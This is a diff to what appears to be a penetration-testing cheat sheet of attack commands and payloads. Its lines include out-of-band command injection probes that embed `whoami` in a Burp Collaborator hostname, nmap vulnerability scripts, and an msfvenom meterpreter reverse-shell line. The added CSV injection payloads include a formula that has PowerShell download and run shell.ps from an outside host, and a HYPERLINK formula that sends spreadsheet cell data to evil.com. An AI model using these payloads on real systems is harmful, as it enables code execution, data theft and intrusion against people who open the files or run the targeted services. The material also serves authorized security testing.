@@ -1,4 +1,3 @@
-
 ping `whoami`.fexpwcppysiky1grj7mbodap5gb7zw.burpcollaborator.net
 nslookup `whoami`.fexpwcppysiky1grj7mbodap5gb7zw.burpcollaborator.net
 
@@ -175,7 +174,7 @@ nmap --script dns-brute --script-args dns-brute.domain=foo.com,dns-brute.threads
 nmap --script dns-brute www.foo.com
 nmap -p80 --script http-iis-short-name-brute <target>
 nmap -sV --script http-vuln-cve2015-1635 --script-args uri='/anotheruri/' >>Remote Code Execution in HTTP.sys (MS15-034)
-nmap --script smb-vuln-ms17-010.nse
+nmap -p445 --script smb-vuln-* <target>  
 nmap --script=http-waf-fingerprint <targets>
 nmap --script=http-waf-fingerprint --script-args http-waf-fingerprint.intensive=1 <targets>
 nmap -p80 --script http-waf-detect <host>
@@ -185,6 +184,36 @@ nmap --script=http-traceroute <targets>
 nmap --script http-open-proxy.nse --script-args proxy.url=<url>,proxy.pattern=<pattern>
 
 nmap -sV -PN -p443 --script http-xssed.nse --script http-stored-xss.nse --script http-dombased-xss.nse --script=http-unsafe-output-escaping --script=http-sql-injection --script http-rfi-spider --script http-csrf.nse --script http-security-headers --script http-enum --script http-title --script ssl-ccs-injection --script http-shellshock --script http-cookie-flags.nse --script http-cors.nse --script http-enum.nse --script http-errors.nse --script http-exif-spider.nse --script http-fileupload-exploiter.nse --script http-form-brute.nse --script http-form-fuzzer.nse --script http-frontpage-login.nse --script http-iis-webdav-vuln.nse --script http-internal-ip-disclosure.nse --script http-open-redirect.nse --script http-malware-host.nse --script http-phpself-xss.nse --script http-phpmyadmin-dir-traversal.nse --script http-php-version.nse --script http-robots.txt.nse --script http-server-header.nse --script http-userdir-enum.nse --script http-waf-detect.nse --script http-waf-fingerprint.nse --script http-xssed.nse --script ssl-enum-ciphers.nse --script ssl-heartbleed.nse --script ssl-poodle.nse --script sslv2-drown.nse --script whois-domain.nse --script dns-fuzz.nse --script http-aspnet-debug.nse --script http-auth-finder.nse --script http-auth.nse --script http-backup-finder.nse 
+
+# Basic usage:
+nmap target --script whois-ip
+
+# To prevent the use of IANA assignments data supply the nofile value
+# to the whodb argument:
+nmap target --script whois-ip --script-args whodb=nofile
+nmap target --script whois-ip --script-args whois.whodb=nofile
+
+# Supplying a sequence of whois services will also prevent the use of
+# IANA assignments data and override the default sequence:
+nmap target --script whois-ip --script-args whodb=arin+ripe+afrinic
+nmap target --script whois-ip --script-args whois.whodb=apnic*lacnic
+# The order in which the services are supplied is the order in which
+# they will be queried. (N.B. commas or semi-colons should not be
+# used to delimit argument values.)
+
+# To return the first record obtained even if it contains a referral
+# to another service, supply the nofollow value to whodb:
+nmap target --script whois-ip --script-args whodb=nofollow
+nmap target --script whois-ip --script-args whois.whodb=nofollow+ripe
+# Note that only one service (the first one supplied) will be used in
+# conjunction with nofollow.
+
+# To ensure discovery of smaller assignments even if larger ones
+# exist in the cache, supply the nocache value to whodb:
+nmap target --script whois-ip --script-args whodb=nocache
+nmap target --script whois-ip --script-args whois.whodb=nocache
+
+nmap --script whois-domain.nse <target>
 
 
 =======================SQLMAP Bypass Waf=====================================
@@ -528,6 +557,11 @@ msfvenom -p linux/x64/meterpreter/reverse_tcp lhost= lport= -f elf -o msf.bin (s
 
 
 
-CSV Injection
+CSV Injection - At present, the best defense strategy we are aware of is prefixing cells that start with ‘=’ , ‘+’ or ‘-’ with an apostrophe. 
 ------------------------------------------
 @SUM(1+9)*cmd|' /C calc'!A0
+=cmd|’/C calc.exe’!Z0
+=cmd|’/Cpowershell Import-Module BitsTransfer; Start-BitsTransfer - source https://141.io/shell.ps; Invoke-Item shell.ps;’!z
+=cmd|’/Ccalc.exe’!z
+=HYPERLINK(“http://evil.com?x="&A3&","&B3&"[CR]","Error fetching info: Click me to resolve.”)
+
